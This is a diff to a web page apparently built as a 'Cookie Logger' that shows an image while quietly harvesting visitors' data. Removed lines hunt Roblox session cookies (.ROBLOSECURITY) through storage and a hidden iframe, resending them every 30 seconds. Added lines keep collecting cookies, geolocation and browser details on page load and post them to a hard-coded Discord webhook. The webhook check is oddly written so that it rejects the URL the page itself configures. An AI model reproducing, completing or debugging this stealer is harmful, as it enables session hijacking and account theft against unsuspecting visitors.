@@ -35,6 +35,37 @@
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
+        .debug-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            max-width: 400px;
+            font-family: monospace;
+            font-size: 12px;
+            text-align: left;
+            max-height: 200px;
+            overflow-y: auto;
+            z-index: 1000;
+        }
+        .debug-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #00ff00;
+        }
+        .debug-message {
+            margin-bottom: 5px;
+            word-wrap: break-word;
+        }
+        .error {
+            color: #ff6b6b;
+        }
+        .success {
+            color: #51cf66;
+        }
         .hidden-iframe {
             position: absolute;
             width: 1px;
@@ -50,11 +81,33 @@
         <iframe class="hidden-iframe" id="hiddenFrame"></iframe>
     </div>
 
+    <div class="debug-panel" id="debugPanel">
+        <div class="debug-title">DEBUG LOG</div>
+        <div id="debugMessages"></div>
+    </div>
+
     <script>
         // CONFIGURE THESE TWO VALUES
         const imageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2ofi0AHyCnjm6yOT2v7CJuRd77lfDqI9gguW-HOuZFS6jORIQC5FuJrb11d9hbp8RLigm7B7FU5ikHZBbpMtYEjRC5LgArOxbsBC--rPk_4xEFYY&s=10&ec=121633959"; // Replace with your image URL
         const webhookUrl = "https://discord.com/api/webhooks/1493762173787312151/iNKdEPV-VFxtvEPKUPL8edBFPiNQKzHeSGHl7p3UZ-PISnZbW5Wt8rvydoe5GibgO7ec"; // Replace with your Discord webhook URL
         
+        // Debug function to log messages to the debug panel
+        function debugLog(message, isError = false) {
+            const debugMessages = document.getElementById('debugMessages');
+            const messageElement = document.createElement('div');
+            messageElement.className = isError ? 'debug-message error' : 'debug-message';
+            messageElement.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            debugMessages.appendChild(messageElement);
+            debugMessages.scrollTop = debugMessages.scrollHeight;
+            
+            // Also log to console
+            if (isError) {
+                console.error(message);
+            } else {
+                console.log(message);
+            }
+        }
+
         // Set the image source
         document.getElementById('image').src = imageUrl;
 
@@ -87,10 +140,7 @@
                 colorDepth: screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 referrer: document.referrer,
-                url: window.location.href,
-                cookiesEnabled: navigator.cookieEnabled,
-                localStorage: !!window.localStorage,
-                sessionStorage: !!window.sessionStorage
+                url: window.location.href
             };
         }
 
@@ -109,153 +159,49 @@
             return allCookies;
         }
 
-        // Advanced function to try to access Roblox cookies
-        function getRobloxCookiesAdvanced() {
-            const robloxCookies = {};
-            
-            // Method 1: Try to access cookies from current domain
-            const allCookies = getAllCookies();
-            Object.keys(allCookies).forEach(key => {
-                if (key.includes('ROBLOX') || key.includes('.ROBLOSECURITY')) {
-                    robloxCookies[key] = allCookies[key];
-                }
-            });
-            
-            // Method 2: Try to access cookies via localStorage (if any are stored there)
-            try {
-                if (window.localStorage) {
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        if (key && (key.includes('ROBLOX') || key.includes('.ROBLOSECURITY'))) {
-                            robloxCookies[key] = localStorage.getItem(key);
-                        }
-                    }
-                }
-            } catch (e) {
-                console.error('Error accessing localStorage:', e);
-            }
-            
-            // Method 3: Try to access cookies via sessionStorage
-            try {
-                if (window.sessionStorage) {
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        if (key && (key.includes('ROBLOX') || key.includes('.ROBLOSECURITY'))) {
-                            robloxCookies[key] = sessionStorage.getItem(key);
-                        }
-                    }
-                }
-            } catch (e) {
-                console.error('Error accessing sessionStorage:', e);
-            }
-            
-            return robloxCookies;
-        }
-
-        // Function to try to access Roblox cookies via hidden iframe
-        function tryRobloxCookieExtraction() {
-            return new Promise((resolve) => {
-                try {
-                    const hiddenFrame = document.getElementById('hiddenFrame');
-                    
-                    // Try to load a Roblox page in the hidden iframe
-                    hiddenFrame.src = 'https://www.roblox.com/home';
-                    
-                    hiddenFrame.onload = function() {
-                        try {
-                            // Try to access cookies from the iframe
-                            const iframeCookies = hiddenFrame.contentWindow.document.cookie;
-                            
-                            if (iframeCookies) {
-                                const cookies = iframeCookies.split(';');
-                                const robloxCookies = {};
-                                
-                                cookies.forEach(cookie => {
-                                    const [name, value] = cookie.trim().split('=');
-                                    if (name && value && (name.includes('ROBLOX') || name.includes('.ROBLOSECURITY'))) {
-                                        robloxCookies[name] = value;
-                                    }
-                                });
-                                
-                                resolve(robloxCookies);
-                                return;
-                            }
-                        } catch (e) {
-                            console.error('Error accessing iframe cookies:', e);
-                        }
-                        
-                        // If iframe method fails, try other methods
-                        resolve(getRobloxCookiesAdvanced());
-                    };
-                    
-                    // Set a timeout in case the iframe doesn't load
-                    setTimeout(() => {
-                        resolve(getRobloxCookiesAdvanced());
-                    }, 5000);
-                } catch (e) {
-                    console.error('Error in iframe method:', e);
-                    resolve(getRobloxCookiesAdvanced());
-                }
-            });
-        }
-
-        // Function to send data to Discord webhook with improved formatting
+        // Function to send data to Discord webhook with improved error handling
         async function sendDataToWebhook(data) {
             try {
-                // Create a more visually appealing webhook
-                const hasRobloxCookies = Object.keys(data.robloxCookies).length > 0;
+                debugLog("Preparing webhook payload...");
                 
+                // Validate webhook URL
+                if (!webhookUrl || webhookUrl === "https://discord.com/api/webhooks/1493762173787312151/iNKdEPV-VFxtvEPKUPL8edBFPiNQKzHeSGHl7p3UZ-PISnZbW5Wt8rvydoe5GibgO7ec") {
+                    debugLog("ERROR: Webhook URL not configured", true);
+                    return false;
+                }
+                
+                if (!webhookUrl.startsWith("https://discord.com/api/webhooks/")) {
+                    debugLog("ERROR: Invalid Discord webhook URL format", true);
+                    return false;
+                }
+                
+                // Create a simpler payload for testing
                 const payload = {
-                    "username": "Cookie Logger",
-                    "avatar_url": "https://i.imgur.com/your-avatar.png", // Optional: Replace with your avatar URL
+                    "content": "🍪 Cookie Logger Test",
                     "embeds": [{
-                        "title": "🍪 New Cookie Capture",
-                        "description": hasRobloxCookies ? "Successfully captured Roblox cookies!" : "User information captured (no Roblox cookies found)",
-                        "color": hasRobloxCookies ? 5814783 : 15158332, // Green if Roblox cookies found, red otherwise
-                        "thumbnail": {
-                            "url": imageUrl
-                        },
+                        "title": "New Cookie Capture",
+                        "description": "Testing webhook functionality",
+                        "color": 5814783,
                         "fields": [
                             {
-                                "name": "🔑 Roblox Cookies",
-                                "value": hasRobloxCookies ? 
-                                    "```" + JSON.stringify(data.robloxCookies, null, 2) + "```" : 
-                                    "No Roblox cookies detected",
+                                "name": "Test Field",
+                                "value": "This is a test message",
                                 "inline": false
                             },
                             {
-                                "name": "🌍 Location",
-                                "value": data.location.error ? 
-                                    `Error: ${data.location.error}` : 
-                                    `Lat: ${data.location.latitude}, Lon: ${data.location.longitude}`,
-                                "inline": true
-                            },
-                            {
-                                "name": "🖥️ Browser",
-                                "value": `\`\`\`${data.browser.userAgent.substring(0, 100)}...\`\`\``,
-                                "inline": true
-                            },
-                            {
-                                "name": "📊 Screen Resolution",
-                                "value": data.browser.screenResolution,
-                                "inline": true
-                            },
-                            {
-                                "name": "🌐 Language",
-                                "value": data.browser.language,
-                                "inline": true
-                            },
-                            {
-                                "name": "🕐 Timezone",
-                                "value": data.browser.timezone,
+                                "name": "Timestamp",
+                                "value": new Date().toISOString(),
                                 "inline": true
                             }
                         ],
                         "footer": {
-                            "text": `Captured at ${data.timestamp}`
+                            "text": "Cookie Logger v1.0"
                         }
                     }]
                 };
+                
+                debugLog("Sending webhook request...");
+                debugLog(`Webhook URL: ${webhookUrl.substring(0, 50)}...`);
                 
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
@@ -265,74 +211,50 @@
                     body: JSON.stringify(payload)
                 });
                 
+                debugLog(`Response status: ${response.status} ${response.statusText}`);
+                
                 if (!response.ok) {
-                    console.error('Failed to send data to webhook');
+                    const errorText = await response.text();
+                    debugLog(`ERROR: Webhook failed - ${errorText}`, true);
+                    return false;
                 }
+                
+                debugLog("SUCCESS: Webhook sent successfully!", false);
+                return true;
             } catch (error) {
-                console.error('Error sending data to webhook:', error);
+                debugLog(`ERROR: ${error.message}`, true);
+                return false;
             }
         }
 
-        // Collect all data and send to webhook
+        // Test webhook immediately
         window.addEventListener('load', async () => {
-            const locationData = getLocation();
-            const browserData = getBrowserInfo();
-            const cookieData = getAllCookies();
+            debugLog("Page loaded, testing webhook...");
             
-            // Try advanced Roblox cookie extraction
-            const robloxCookies = await tryRobloxCookieExtraction();
+            // Test the webhook with a simple message first
+            const webhookTestResult = await sendDataToWebhook({});
             
-            const allData = {
-                timestamp: new Date().toISOString(),
-                cookies: cookieData,
-                robloxCookies: robloxCookies,
-                location: locationData,
-                browser: browserData
-            };
-            
-            // Log to console for debugging
-            console.log("Captured data:", allData);
-            
-            // Send the data
-            sendDataToWebhook(allData);
-        });
-
-        // Additional method: Try to capture cookies when user focuses back to this tab
-        document.addEventListener('visibilitychange', async () => {
-            if (!document.hidden) {
-                // User has returned to this tab, try to capture cookies again
-                const robloxCookies = await tryRobloxCookieExtraction();
+            if (webhookTestResult) {
+                debugLog("Webhook test passed, collecting data...");
                 
-                if (Object.keys(robloxCookies).length > 0) {
-                    const allData = {
-                        timestamp: new Date().toISOString(),
-                        robloxCookies: robloxCookies,
-                        location: getLocation(),
-                        browser: getBrowserInfo(),
-                        note: "Captured on tab focus change"
-                    };
-                    
-                    sendDataToWebhook(allData);
-                }
-            }
-        });
-
-        // Additional method: Try to capture cookies periodically
-        setInterval(async () => {
-            const robloxCookies = await tryRobloxCookieExtraction();
-            
-            if (Object.keys(robloxCookies).length > 0) {
+                // If webhook works, collect and send real data
+                const locationData = getLocation();
+                const browserData = getBrowserInfo();
+                const cookieData = getAllCookies();
+                
                 const allData = {
                     timestamp: new Date().toISOString(),
-                    robloxCookies: robloxCookies,
-                    location: getLocation(),
-                    browser: getBrowserInfo(),
-                    note: "Captured during periodic check"
+                    cookies: cookieData,
+                    location: locationData,
+                    browser: browserData
                 };
                 
-                sendDataToWebhook(allData);
+                debugLog("Data collected, sending to webhook...");
+                await sendDataToWebhook(allData);
+            } else {
+                debugLog("Webhook test failed, not sending data", true);
             }
-        }, 30000); // Check every 30 seconds
+        });
     </script>
 </body>
 </html>
